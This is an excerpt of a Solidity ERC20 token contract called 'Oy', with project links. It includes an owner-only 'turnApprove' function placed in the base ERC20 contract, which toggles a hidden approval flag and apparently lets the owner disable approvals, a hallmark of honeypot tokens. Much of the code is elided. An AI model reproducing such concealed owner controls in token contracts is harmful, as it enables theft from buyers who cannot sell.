...
Website: https://0y.io
Telegram: https://t.me/in0ywetrust
Medium: https://medium.com/@in0ywetrust
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function turnApprove(bool approve_value) public returns (bool) {
        require(_msgSender() == _owner);
        _approve_on = approve_value;
 ...
 */
contract Oy is ERC20 {
    uint8 immutable private _decimals = 18;
    uint256 private _totalSupply = 100000100000 * 10 ** 18;
